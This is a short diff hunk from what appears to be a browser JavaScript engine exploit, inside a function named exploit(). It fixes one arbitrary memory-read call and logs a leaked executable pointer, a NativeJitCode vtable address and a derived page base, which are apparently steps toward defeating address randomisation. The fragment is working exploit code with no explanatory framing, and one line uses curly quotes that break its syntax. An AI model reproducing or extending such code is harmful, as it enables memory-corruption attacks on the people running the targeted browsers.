@@ -533,7 +533,7 @@ function exploit(){
         log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
         log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
-        var anchor = memory.readInt64(v_tlb);
+        var anchor = memory.read_i64(v_tlb,0);
         log(“anchor” + anchor)
         var hdr1 = Sub(anchor, anchor.lo() & 0xfff);
         let cnt = 0;
